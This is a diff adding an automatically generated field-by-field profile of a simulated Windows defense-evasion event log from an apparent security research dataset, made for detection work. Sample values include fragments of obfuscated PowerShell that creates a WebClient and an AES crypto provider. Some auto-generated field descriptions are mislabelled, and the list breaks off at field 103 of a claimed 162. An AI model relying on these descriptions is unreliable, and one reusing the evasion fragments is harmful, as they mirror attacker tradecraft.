@@ -1,0 +1,1144 @@
+====================================================================================================
+WINDOWS EVENT LOG FIELD ANALYSIS
+====================================================================================================
+Analysis Date: 2025-09-04 12:23:48
+Dataset: ../mordor_dataset/def_evade_log.json
+Total Events Processed: 2,390
+Unique Fields Discovered: 162
+====================================================================================================
+
+FIELD INVENTORY (Sorted by Frequency)
+==================================================
+
+1. Field: Task
+   Frequency: 2,390 events (100.0%)
+   Data Types: int
+   Description: Task category identifier for the Windows event
+   Sample Values: 12810, 11, 10, 13, 12
+
+2. Field: EventReceivedTime
+   Frequency: 2,390 events (100.0%)
+   Data Types: str
+   String Length: 19 - 19 characters
+   Description: Timestamp when the event was received by the log collection system
+   Sample Values: 2020-07-21 23:27:42, 2020-07-21 23:27:43, 2020-07-21 23:27:45, 2020-07-21 23:27:46, 2020-07-21 23:27:47
+
+3. Field: port
+   Frequency: 2,390 events (100.0%)
+   Data Types: int
+   Description: Port number associated with the network activity
+   Sample Values: 55069
+
+4. Field: SeverityValue
+   Frequency: 2,390 events (100.0%)
+   Data Types: int
+   Description: Numeric severity level for programmatic processing
+   Sample Values: 2, 4, 1, 3
+
+5. Field: Keywords
+   Frequency: 2,390 events (100.0%)
+   Data Types: int
+   Description: Bitmask indicating event properties and categories
+   Sample Values: -9214364837600034816, -9223372036854775808, 36028797018963968, -9218868437227405312, 0
+
+6. Field: @version
+   Frequency: 2,390 events (100.0%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Log processing pipeline version
+   Sample Values: 1
+
+7. Field: SourceModuleType
+   Frequency: 2,390 events (100.0%)
+   Data Types: str
+   String Length: 13 - 13 characters
+   Description: Type of log collection module used
+   Sample Values: im_msvistalog
+
+8. Field: tags
+   Frequency: 2,390 events (100.0%)
+   Data Types: list
+   Description: Array of tags applied to the event for classification
+   Sample Values: [array with 1 items]
+
+9. Field: SourceName
+   Frequency: 2,390 events (100.0%)
+   Data Types: str
+   String Length: 10 - 35 characters
+   Description: Windows component or service that generated the event
+   Sample Values: Microsoft-Windows-Security-Auditing, Microsoft-Windows-Sysmon, PowerShell, Microsoft-Windows-PowerShell, Microsoft-Windows-WMI-Activity
+
+10. Field: Channel
+   Frequency: 2,390 events (100.0%)
+   Data Types: str
+   String Length: 8 - 42 characters
+   Description: Windows Event Log channel (Security, System, Application, etc.)
+   Sample Values: Security, Microsoft-Windows-Sysmon/Operational, Windows PowerShell, Microsoft-Windows-PowerShell/Operational, Microsoft-Windows-WMI-Activity/Operational
+
+11. Field: SourceModuleName
+   Frequency: 2,390 events (100.0%)
+   Data Types: str
+   String Length: 8 - 8 characters
+   Description: Name of the log collection module
+   Sample Values: eventlog
+
+12. Field: Message
+   Frequency: 2,390 events (100.0%)
+   Data Types: str
+   Description: Human-readable description of the event with detailed information
+   Sample Values: [Contains structured event descriptions - too verbose to display]
+
+13. Field: @timestamp
+   Frequency: 2,390 events (100.0%)
+   Data Types: str
+   String Length: 24 - 24 characters
+   Description: ISO formatted timestamp for event indexing and searching
+   Sample Values: 2020-07-22T03:27:42.455Z, 2020-07-22T03:27:42.456Z, 2020-07-22T03:27:43.468Z, 2020-07-22T03:27:43.469Z, 2020-07-22T03:27:43.470Z
+
+14. Field: Hostname
+   Frequency: 2,390 events (100.0%)
+   Data Types: str
+   String Length: 21 - 25 characters
+   Description: Name of the computer/system where the event occurred
+   Sample Values: WORKSTATION5.mordor.local, MORDORDC.mordor.local, WORKSTATION6.mordor.local
+
+15. Field: host
+   Frequency: 2,390 events (100.0%)
+   Data Types: str
+   String Length: 25 - 25 characters
+   Description: Log collection host or forwarding system identifier
+   Sample Values: wec.internal.cloudapp.net
+
+16. Field: ExecutionProcessID
+   Frequency: 2,390 events (100.0%)
+   Data Types: int
+   Description: Process ID of the system process handling the event
+   Sample Values: 4, 5068, 7856, 9368, 0
+
+17. Field: EventType
+   Frequency: 2,390 events (100.0%)
+   Data Types: str
+   String Length: 4 - 13 characters
+   Description: Type of audit event (AUDIT_SUCCESS, AUDIT_FAILURE, etc.)
+   Sample Values: AUDIT_SUCCESS, INFO, SetValue, CreateKey, AUDIT_FAILURE
+
+18. Field: EventTime
+   Frequency: 2,390 events (100.0%)
+   Data Types: str
+   String Length: 19 - 19 characters
+   Description: Timestamp when the event occurred on the source system
+   Sample Values: 2020-07-21 23:27:39, 2020-07-21 23:27:40, 2020-07-21 23:27:41, 2020-07-21 23:27:42, 2020-07-21 23:27:43
+
+19. Field: Severity
+   Frequency: 2,390 events (100.0%)
+   Data Types: str
+   String Length: 4 - 7 characters
+   Description: Event severity level (INFO, WARNING, ERROR, CRITICAL)
+   Sample Values: INFO, ERROR, DEBUG, WARNING
+
+20. Field: EventID
+   Frequency: 2,390 events (100.0%)
+   Data Types: int
+   Description: Unique identifier for the specific type of Windows event
+   Sample Values: 5156, 11, 10, 5158, 13
+
+21. Field: ThreadID
+   Frequency: 2,390 events (100.0%)
+   Data Types: int
+   Description: Thread identifier within the process that generated the event
+   Sample Values: 8792, 4704, 2712, 3296, 6664
+
+22. Field: RecordNumber
+   Frequency: 2,390 events (100.0%)
+   Data Types: int
+   Description: Sequential record number from the source log
+   Sample Values: 253295, 253296, 8990294, 8990295, 8990296
+
+23. Field: ProviderGuid
+   Frequency: 2,335 events (97.7%)
+   Data Types: str
+   String Length: 38 - 38 characters
+   Description: Unique identifier for the event provider
+   Sample Values: {54849625-5478-4994-A5BA-3E3B0328C30D}, {5770385F-C22A-43E0-BF4C-06F5698FFBD9}, {A0C1853B-5C40-4B15-8766-3CF1C58F985A}, {1418EF04-B0B4-4623-BF7E-D74AB47BBDAA}
+
+24. Field: Version
+   Frequency: 2,335 events (97.7%)
+   Data Types: int
+   Description: Event schema version number
+   Sample Values: 1, 2, 3, 0, 5
+
+25. Field: OpcodeValue
+   Frequency: 2,335 events (97.7%)
+   Data Types: int
+   Description: Numeric opcode value for programmatic processing
+   Sample Values: 0, 20, 15, 1, 10
+
+26. Field: ProcessId
+   Frequency: 2,268 events (94.9%)
+   Data Types: str
+   String Length: 1 - 6 characters
+   Description: Unique process identifier for the application involved in the event
+   Sample Values: 3580, 3432, 3732, 1504, 5692
+
+27. Field: Domain
+   Frequency: 1,823 events (76.3%)
+   Data Types: str
+   String Length: 6 - 12 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: NT AUTHORITY, MORDOR
+
+28. Field: UserID
+   Frequency: 1,823 events (76.3%)
+   Data Types: str
+   String Length: 8 - 45 characters
+   Description: User-related field - contains user account information
+   Sample Values: S-1-5-18, S-1-5-21-2253742117-2054739524-205962475-1104, S-1-5-20
+
+29. Field: AccountType
+   Frequency: 1,823 events (76.3%)
+   Data Types: str
+   String Length: 4 - 16 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: User, Well Known Group
+
+30. Field: AccountName
+   Frequency: 1,823 events (76.3%)
+   Data Types: str
+   String Length: 6 - 15 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: SYSTEM, pgustavo, NETWORK SERVICE
+
+31. Field: RuleName
+   Frequency: 1,762 events (73.7%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: -
+
+32. Field: UtcTime
+   Frequency: 1,762 events (73.7%)
+   Data Types: str
+   String Length: 23 - 23 characters
+   Description: UTC timestamp of the event
+   Sample Values: 2020-07-22 03:27:40.949, 2020-07-22 03:27:41.885, 2020-07-22 03:27:43.204, 2020-07-22 03:27:44.668, 2020-07-22 03:27:46.711
+
+33. Field: ProcessGuid
+   Frequency: 1,497 events (62.6%)
+   Data Types: str
+   String Length: 38 - 38 characters
+   Description: Globally unique process identifier
+   Sample Values: {47b21e2e-952d-5f14-2200-000000000400}, {47b21e2e-9538-5f14-5200-000000000400}, {47b21e2e-9538-5f14-4b00-000000000400}, {b59756a9-996d-5f14-4900-000000000400}, {03255e25-996e-5f14-4900-000000000400}
+
+34. Field: Image
+   Frequency: 1,497 events (62.6%)
+   Data Types: str
+   String Length: 6 - 132 characters
+   Description: Full path to the executable image
+   Sample Values: C:\windows\System32\svchost.exe, C:\windows\system32\svchost.exe, C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.4.1587.1\NetworkWatcherAgent\NetworkWatcherAgent.exe, C:\Windows\System32\svchost.exe, C:\windows\Explorer.EXE
+
+35. Field: EventTypeOrignal
+   Frequency: 902 events (37.7%)
+   Data Types: str
+   String Length: 4 - 4 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: INFO
+
+36. Field: TargetObject
+   Frequency: 896 events (37.5%)
+   Data Types: str
+   String Length: 4 - 234 characters
+   Description: Registry key or value that was accessed
+   Sample Values: HKLM\System\CurrentControlSet\Services\W32Time\Config\LastKnownGoodTime, HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections, HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections, HKLM\System\CurrentControlSet\Services\Tcpip\Parameters, HKU\S-1-5-21-2253742117-2054739524-205962475-1104\Software\Microsoft\Windows\CurrentVersion\ActivityDataModel\ReaderRevisionInfo\4E0ADC22-7F3B-B93D-82C3-B2425669E3AE
+
+37. Field: Opcode
+   Frequency: 628 events (26.3%)
+   Data Types: str
+   String Length: 4 - 52 characters
+   Description: Operation code indicating the specific operation performed
+   Sample Values: Info, To be used when operation is just executing a method, On create calls, Start, Open (async)
+
+38. Field: Category
+   Frequency: 627 events (26.2%)
+   Data Types: str
+   String Length: 5 - 29 characters
+   Description: Event category providing context about the type of activity
+   Sample Values: Filtering Platform Connection, Pipeline Execution Details, Provider Lifecycle, Process Creation, Engine Lifecycle
+
+39. Field: Hashes
+   Frequency: 545 events (22.8%)
+   Data Types: str
+   String Length: 195 - 195 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: SHA1=6568746F4670B16F8E338130A397A482DEB792B3,MD5=D314A717FA9630AD081C6BDEB4C61016,SHA256=41ED39261F76565961742935CC0E22CF59ED9E35F1FA16626DC306A671665002,IMPHASH=7A6EC8EB9E60CF692697563F6BBC47D9, SHA1=348ECF645C175FE1BCAC883AECBA772AF71FCC1B,MD5=7C585044BFB8C5F7431BE7CEC368C1D7,SHA256=372A0BD724BECBE1B5F135F0EEBF437726A20995DB4B7128D09FC018BF0A9B42,IMPHASH=46D841D6B9431C85B1224721FAD51789, SHA1=BB5740E39AD439369C5B8AAF40270584B9192B98,MD5=75B1579F05F8EBE33E59A1BBC451725A,SHA256=BD197C3A34DFC40A217A5A6463852AEFAEDB41209C32DBA68D186CB31050AA1D,IMPHASH=C3CD4CC046A2F9166C20BA203AF303C0, SHA1=41DE5F5C5B1A510C242B547DECA255C8E45D8F23,MD5=42390474E879A10E0845C31B423B6429,SHA256=A599E64CEDFDC1FC83A26C16CD5489845CE1F5193A1D47C16EDA31A877DE05F1,IMPHASH=40361D3C7E0F5584BFB571747DB802D4, SHA1=C1907DBEAA74E03B73A2FE0D16F497EB6842F1D6,MD5=04E6358C6DD4B1A85241511F372413E4,SHA256=BA1520DC9D01CD4956D77AF9A90D5D998003E9371B7157010F80CF9368B21A54,IMPHASH=C4AB96EBAAEC4F9F1CA58498083E8E3B
+
+40. Field: Product
+   Frequency: 542 events (22.7%)
+   Data Types: str
+   String Length: 1 - 47 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: Microsoft® Windows® Operating System, Windows® Search, Microsoft ® Windows ® Script Component Runtime, Internet Explorer, -
+
+41. Field: Description
+   Frequency: 542 events (22.7%)
+   Data Types: str
+   String Length: 1 - 84 characters
+   Description: Network address field - contains IP address information
+   Sample Values: Windows.Shell.ServiceHostBuilder, App Resolver, BCP47 Language Classes, Software Licensing Client Dll, Userenv
+
+42. Field: OriginalFileName
+   Frequency: 542 events (22.7%)
+   Data Types: str
+   String Length: 1 - 58 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: Windows.Shell.ServiceHostBuilder.dll, AppResolver.dll, BCP47Lang.dll, slc.dll, userenv.dll
+
+43. Field: FileVersion
+   Frequency: 542 events (22.7%)
+   Data Types: str
+   String Length: 1 - 42 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: 10.0.18362.1 (WinBuild.160101.0800), 10.0.18362.356 (WinBuild.160101.0800), 10.0.18362.657 (WinBuild.160101.0800), 10.0.18362.815 (WinBuild.160101.0800), 10.0.18362.387 (WinBuild.160101.0800)
+
+44. Field: Company
+   Frequency: 542 events (22.7%)
+   Data Types: str
+   String Length: 1 - 21 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: Microsoft Corporation, -
+
+45. Field: SignatureStatus
+   Frequency: 535 events (22.4%)
+   Data Types: str
+   String Length: 5 - 11 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: Valid, Unavailable
+
+46. Field: Signed
+   Frequency: 535 events (22.4%)
+   Data Types: str
+   String Length: 4 - 5 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: true, false
+
+47. Field: Signature
+   Frequency: 535 events (22.4%)
+   Data Types: str
+   String Length: 1 - 27 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: Microsoft Windows, Microsoft Corporation, -, Microsoft Windows Publisher
+
+48. Field: ImageLoaded
+   Frequency: 535 events (22.4%)
+   Data Types: str
+   String Length: 27 - 148 characters
+   Description: Process-related field - contains process execution context
+   Sample Values: C:\Windows\System32\Windows.Shell.ServiceHostBuilder.dll, C:\Windows\System32\AppResolver.dll, C:\Windows\System32\BCP47Langs.dll, C:\Windows\System32\slc.dll, C:\Windows\System32\userenv.dll
+
+49. Field: SourceProcessId
+   Frequency: 316 events (13.2%)
+   Data Types: str
+   String Length: 2 - 6 characters
+   Description: Process-related field - contains process execution context
+   Sample Values: 5692, 60, 5464, 4240, 6732
+
+50. Field: TargetProcessId
+   Frequency: 316 events (13.2%)
+   Data Types: str
+   String Length: 3 - 4 characters
+   Description: Process-related field - contains process execution context
+   Sample Values: 8372, 7336, 7756, 7044, 2024
+
+51. Field: SubjectUserSid
+   Frequency: 271 events (11.3%)
+   Data Types: str
+   String Length: 7 - 45 characters
+   Description: User-related field - contains user account information
+   Sample Values: S-1-5-21-2253742117-2054739524-205962475-1104, S-1-5-18, S-1-5-20, S-1-0-0
+
+52. Field: SubjectUserName
+   Frequency: 271 events (11.3%)
+   Data Types: str
+   String Length: 1 - 13 characters
+   Description: User name of the subject
+   Sample Values: pgustavo, WORKSTATION5$, SYSTEM, MORDORDC$, -
+
+53. Field: SubjectDomainName
+   Frequency: 271 events (11.3%)
+   Data Types: str
+   String Length: 1 - 12 characters
+   Description: Domain name of the subject
+   Sample Values: MORDOR, NT AUTHORITY, -
+
+54. Field: SubjectLogonId
+   Frequency: 271 events (11.3%)
+   Data Types: str
+   String Length: 3 - 9 characters
+   Description: Logon ID of the subject
+   Sample Values: 0x24579a8, 0x3e7, 0x3e4, 0x565d702, 0x0
+
+55. Field: SourceProcessGUID
+   Frequency: 265 events (11.1%)
+   Data Types: str
+   String Length: 38 - 38 characters
+   Description: Process-related field - contains process execution context
+   Sample Values: {03255e25-a583-5f17-2b05-000000000400}, {47b21e2e-952c-5f14-1000-000000000400}, {b59756a9-89a0-5f17-e005-000000000400}, {b59756a9-997b-5f14-7000-000000000400}, {03255e25-a58f-5f17-4105-000000000400}
+
+56. Field: SourceThreadId
+   Frequency: 265 events (11.1%)
+   Data Types: str
+   String Length: 3 - 4 characters
+   Description: Identifier field - likely used for correlation and tracking
+   Sample Values: 6008, 5876, 6336, 4036, 5700
+
+57. Field: GrantedAccess
+   Frequency: 265 events (11.1%)
+   Data Types: str
+   String Length: 4 - 8 characters
+   Description: Granted access permissions
+   Sample Values: 0x2000, 0x1000, 0x1410, 0x1fffff, 0x1478
+
+58. Field: TargetImage
+   Frequency: 265 events (11.1%)
+   Data Types: str
+   String Length: 23 - 111 characters
+   Description: Process-related field - contains process execution context
+   Sample Values: C:\Windows\SystemApps\InputApp_cw5n1h2txyewy\WindowsInternal.ComposableShell.Experiences.TextInput.InputApp.exe, C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe, C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe, C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe, C:\Windows\System32\MicrosoftEdgeCP.exe
+
+59. Field: TargetProcessGUID
+   Frequency: 265 events (11.1%)
+   Data Types: str
+   String Length: 38 - 38 characters
+   Description: Process-related field - contains process execution context
+   Sample Values: {03255e25-a687-5f17-9805-000000000400}, {03255e25-a59d-5f17-4d05-000000000400}, {03255e25-a65e-5f17-9105-000000000400}, {03255e25-a597-5f17-4405-000000000400}, {03255e25-af97-5f17-8806-000000000400}
+
+60. Field: CallTrace
+   Frequency: 265 events (11.1%)
+   Data Types: str
+   String Length: 143 - 1271 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+2726e|C:\windows\system32\twinui.dll+72a89|C:\windows\SYSTEM32\ntdll.dll+30729|C:\windows\SYSTEM32\ntdll.dll+345b4|C:\windows\Sys..., C:\windows\SYSTEM32\ntdll.dll+9fc24|C:\windows\System32\KERNELBASE.dll+6c175|c:\windows\system32\lsm.dll+e575|C:\windows\System32\RPCRT4.dll+77803|C:\windows\System32\RPCRT4.dll+db4a6|C:\windows\Syste..., C:\windows\SYSTEM32\ntdll.dll+9fc24|C:\windows\System32\KERNELBASE.dll+6c175|c:\windows\system32\lsm.dll+ebf0|C:\windows\System32\RPCRT4.dll+77803|C:\windows\System32\RPCRT4.dll+db4a6|C:\windows\Syste..., C:\windows\SYSTEM32\ntdll.dll+9fc24|C:\windows\System32\KERNELBASE.dll+6c175|c:\windows\system32\lsm.dll+ea4e|C:\windows\System32\RPCRT4.dll+77803|C:\windows\System32\RPCRT4.dll+db4a6|C:\windows\Syste..., C:\windows\SYSTEM32\ntdll.dll+9c534|C:\windows\System32\KERNELBASE.dll+2726e|c:\windows\system32\cbdhsvc.dll+b5270|c:\windows\system32\cbdhsvc.dll+1f138|c:\windows\system32\cbdhsvc.dll+1ea7e|c:\window...
+
+61. Field: SourceImage
+   Frequency: 265 events (11.1%)
+   Data Types: str
+   String Length: 23 - 57 characters
+   Description: Process-related field - contains process execution context
+   Sample Values: C:\windows\Explorer.EXE, C:\windows\system32\svchost.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\windows\system32\csrss.exe, C:\windows\System32\svchost.exe
+
+62. Field: SourcePort
+   Frequency: 264 events (11.0%)
+   Data Types: str
+   String Length: 2 - 5 characters
+   Description: Source port number for network connections
+   Sample Values: 49988, 49682, 63406, 49685, 64453
+
+63. Field: Protocol
+   Frequency: 264 events (11.0%)
+   Data Types: str
+   String Length: 1 - 3 characters
+   Description: Network protocol number (e.g., 6=TCP, 17=UDP)
+   Sample Values: 6, tcp, 17, udp
+
+64. Field: FilterRTID
+   Frequency: 239 events (10.0%)
+   Data Types: str
+   String Length: 1 - 5 characters
+   Description: Windows Filtering Platform filter runtime ID
+   Sample Values: 71485, 72497, 69282, 69279, 0
+
+65. Field: LayerName
+   Frequency: 239 events (10.0%)
+   Data Types: str
+   String Length: 7 - 7 characters
+   Description: Name of the Windows Filtering Platform layer
+   Sample Values: %%14611, %%14608, %%14610
+
+66. Field: SourceAddress
+   Frequency: 239 events (10.0%)
+   Data Types: str
+   String Length: 2 - 25 characters
+   Description: Source IP address for network connections
+   Sample Values: 172.18.39.5, 172.18.38.5, 0.0.0.0, 172.18.38.6, fe80::6c96:34e3:33cb:dbba
+
+67. Field: Application
+   Frequency: 239 events (10.0%)
+   Data Types: str
+   String Length: 48 - 153 characters
+   Description: Full path and filename of the application involved in the event
+   Sample Values: \device\harddiskvolume2\packages\plugins\microsoft.azure.networkwatcher.networkwatcheragentwindows\1.4.1587.1\networkwatcheragent\networkwatcheragent.exe, \device\harddiskvolume4\packages\plugins\microsoft.azure.networkwatcher.networkwatcheragentwindows\1.4.1587.1\networkwatcheragent\networkwatcheragent.exe, \device\harddiskvolume4\windowsazure\packages\guestagent\windowsazureguestagent.exe, \device\harddiskvolume2\windows\system32\svchost.exe, \device\harddiskvolume2\windows\system32\regsvr32.exe
+
+68. Field: LayerRTID
+   Frequency: 239 events (10.0%)
+   Data Types: str
+   String Length: 2 - 2 characters
+   Description: Windows Filtering Platform layer runtime ID
+   Sample Values: 48, 36, 44, 46, 50
+
+69. Field: Direction
+   Frequency: 216 events (9.0%)
+   Data Types: str
+   String Length: 7 - 7 characters
+   Description: Network traffic direction (inbound/outbound)
+   Sample Values: %%14593, %%14592
+
+70. Field: RemoteUserID
+   Frequency: 216 events (9.0%)
+   Data Types: str
+   String Length: 7 - 7 characters
+   Description: Security identifier of remote user in network connections
+   Sample Values: S-1-0-0
+
+71. Field: RemoteMachineID
+   Frequency: 216 events (9.0%)
+   Data Types: str
+   String Length: 7 - 7 characters
+   Description: Security identifier of remote machine in network connections
+   Sample Values: S-1-0-0
+
+72. Field: DestAddress
+   Frequency: 216 events (9.0%)
+   Data Types: str
+   String Length: 3 - 25 characters
+   Description: Destination IP address for network connections
+   Sample Values: 169.254.169.254, 168.63.129.16, 10.10.10.5, 172.18.38.5, fe80::6c96:34e3:33cb:dbba
+
+73. Field: DestPort
+   Frequency: 216 events (9.0%)
+   Data Types: str
+   String Length: 2 - 5 characters
+   Description: Destination port number for network connections
+   Sample Values: 80, 32526, 8037, 8444, 389
+
+74. Field: Details
+   Frequency: 214 events (9.0%)
+   Data Types: str
+   String Length: 3 - 85 characters
+   Description: Details of registry operation
+   Sample Values: QWORD (0x01d65fd8-0x0f865f72), QWORD (0x01d65fd8-0x119d8ca4), QWORD (0x01d65fd8-0x126e84b3), Binary Data, DWORD (0x00000001)
+
+75. Field: ProcessName
+   Frequency: 209 events (8.7%)
+   Data Types: str
+   String Length: 1 - 57 characters
+   Description: Process-related field - contains process execution context
+   Sample Values: C:\Windows\System32\regsvr32.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\services.exe, C:\Windows\System32\svchost.exe
+
+76. Field: ObjectServer
+   Frequency: 194 events (8.1%)
+   Data Types: str
+   String Length: 8 - 8 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: Security
+
+77. Field: HandleId
+   Frequency: 187 events (7.8%)
+   Data Types: str
+   String Length: 4 - 6 characters
+   Description: Identifier field - likely used for correlation and tracking
+   Sample Values: 0x3364, 0x88, 0x17f8, 0x47c, 0x504
+
+78. Field: ObjectType
+   Frequency: 86 events (3.6%)
+   Data Types: str
+   String Length: 3 - 5 characters
+   Description: Type of accessed object
+   Sample Values: Key, Token
+
+79. Field: ObjectName
+   Frequency: 86 events (3.6%)
+   Data Types: str
+   String Length: 1 - 82 characters
+   Description: Name of accessed object
+   Sample Values: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa, \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Session Manager\Environment, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon, \REGISTRY\MACHINE\SOFTWARE\Microsoft\.NETFramework, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN
+
+80. Field: ResourceAttributes
+   Frequency: 84 events (3.5%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: -
+
+81. Field: AccessList
+   Frequency: 84 events (3.5%)
+   Data Types: str
+   String Length: 12 - 84 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: %%4432, %%1538 %%4432 %%4435 %%4436, %%1537 %%1538 %%4432 %%4433 %%4434 %%4435 %%4436
+
+82. Field: AccessMask
+   Frequency: 84 events (3.5%)
+   Data Types: str
+   String Length: 3 - 7 characters
+   Description: Access mask for object access
+   Sample Values: 0x1, 0x20019, 0x3001f
+
+83. Field: ActivityID
+   Frequency: 63 events (2.6%)
+   Data Types: str
+   String Length: 38 - 38 characters
+   Description: Identifier field - likely used for correlation and tracking
+   Sample Values: {17E565D6-3A73-0000-BD95-D681FF5DD601}, {17E565D6-3A73-0000-2305-DA81FF5DD601}, {17E565D6-3A73-0001-9208-9A81FF5DD601}, {17E565D6-3A73-0000-2505-DA81FF5DD601}, {17E565D6-3A73-0000-8F07-DA81FF5DD601}
+
+84. Field: PrivilegeList
+   Frequency: 60 events (2.5%)
+   Data Types: str
+   String Length: 1 - 320 characters
+   Description: List of privileges
+   Sample Values: -, SeTcbPrivilege, SeCreateGlobalPrivilege, SeAssignPrimaryTokenPrivilege SeTcbPrivilege SeSecurityPrivilege SeTakeOwnershipPrivilege SeLoadDriverPrivilege SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege Se..., SeProfileSingleProcessPrivilege
+
+85. Field: Payload
+   Frequency: 54 events (2.3%)
+   Data Types: str
+   String Length: 45 - 1991 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: CommandInvocation(PSConsoleHostReadLine): "PSConsoleHostReadLine", CommandInvocation(Out-Default): "Out-Default", CommandInvocation(Set-StrictMode): "Set-StrictMode" ParameterBinding(Set-StrictMode): name="Off"; value="True", CommandInvocation(New-Object): "New-Object" ParameterBinding(New-Object): name="TypeName"; value="SysTEm.NEt.WebClIENt", CommandInvocation(New-Object): "New-Object" ParameterBinding(New-Object): name="TypeName"; value="SySTeM.SecuRItY.CrYPtoGRAPhy.AESCRYPToSerVIcEProVIder"
+
+86. Field: ContextInfo
+   Frequency: 54 events (2.3%)
+   Data Types: str
+   String Length: 608 - 5775 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: Severity = Informational Host Name = ConsoleHost Host Version = 5.1.18362.752 Host ID = 6d6b6eef-1252-4b65-8d97-0532788a2db2 Host Application = C:\Windows\System32\..., Severity = Informational Host Name = ConsoleHost Host Version = 5.1.18362.752 Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223 Host Application = C:\Windows\System32\...
+
+87. Field: TargetHandleId
+   Frequency: 51 events (2.1%)
+   Data Types: str
+   String Length: 6 - 6 characters
+   Description: Identifier field - likely used for correlation and tracking
+   Sample Values: 0x3364, 0x17f8, 0x3ec8, 0x30a0, 0x2b7c
+
+88. Field: SourceHandleId
+   Frequency: 51 events (2.1%)
+   Data Types: str
+   String Length: 4 - 6 characters
+   Description: Identifier field - likely used for correlation and tracking
+   Sample Values: 0x88, 0x47c, 0x504, 0x520, 0x518
+
+89. Field: RestrictedSidCount
+   Frequency: 51 events (2.1%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Identifier field - likely used for correlation and tracking
+   Sample Values: 0
+
+90. Field: TransactionId
+   Frequency: 51 events (2.1%)
+   Data Types: str
+   String Length: 38 - 38 characters
+   Description: Identifier field - likely used for correlation and tracking
+   Sample Values: {00000000-0000-0000-0000-000000000000}
+
+91. Field: AccessReason
+   Frequency: 51 events (2.1%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Field discovered in dataset - requires detailed analysis for context
+   Sample Values: -
+
+92. Field: User
+   Frequency: 35 events (1.5%)
+   Data Types: str
+   String Length: 15 - 28 characters
+   Description: User account associated with the process
+   Sample Values: MORDOR\pgustavo, NT AUTHORITY\SYSTEM, NT AUTHORITY\NETWORK SERVICE
+
+93. Field: DestinationPort
+   Frequency: 25 events (1.0%)
+   Data Types: str
+   String Length: 2 - 5 characters
+   Description: Destination port number
+   Sample Values: 5985, 8444, 80, 62654, 135
+
+94. Field: SourceIp
+   Frequency: 25 events (1.0%)
+   Data Types: str
+   String Length: 11 - 15 characters
+   Description: Source IP address
+   Sample Values: 172.18.39.5, 172.18.38.5, 172.18.38.6, 0:0:0:0:0:0:0:1
+
+95. Field: SourceHostname
+   Frequency: 25 events (1.0%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Hostname of the source
+   Sample Values: -
+
+96. Field: SourceIsIpv6
+   Frequency: 25 events (1.0%)
+   Data Types: str
+   String Length: 4 - 5 characters
+   Description: Network address field - contains IP address information
+   Sample Values: false, true
+
+97. Field: DestinationPortName
+   Frequency: 25 events (1.0%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Network port field - contains port number information
+   Sample Values: -
+
+98. Field: Initiated
+   Frequency: 25 events (1.0%)
+   Data Types: str
+   String Length: 4 - 5 characters
+   Description: Whether connection was initiated locally
+   Sample Values: true, false
+
+99. Field: DestinationIp
+   Frequency: 25 events (1.0%)
+   Data Types: str
+   String Length: 10 - 15 characters
+   Description: Destination IP address
+   Sample Values: 172.18.38.6, 10.10.10.5, 172.18.38.5, 0:0:0:0:0:0:0:1, 52.167.250.154
+
+100. Field: DestinationHostname
+   Frequency: 25 events (1.0%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Hostname of the destination
+   Sample Values: -
+
+101. Field: SourcePortName
+   Frequency: 25 events (1.0%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Network port field - contains port number information
+   Sample Values: -
+
+102. Field: DestinationIsIpv6
+   Frequency: 25 events (1.0%)
+   Data Types: str
+   String Length: 4 - 5 characters
+   Description: Network address field - contains IP address information
+   Sample Values: false, true
+
+103. Field: TargetUserSid
+   Frequency: 24 events (1.0%)
+   Data Types: str
+   String Length: 7 - 45 characters
+   Description: User-related field - contains user account information
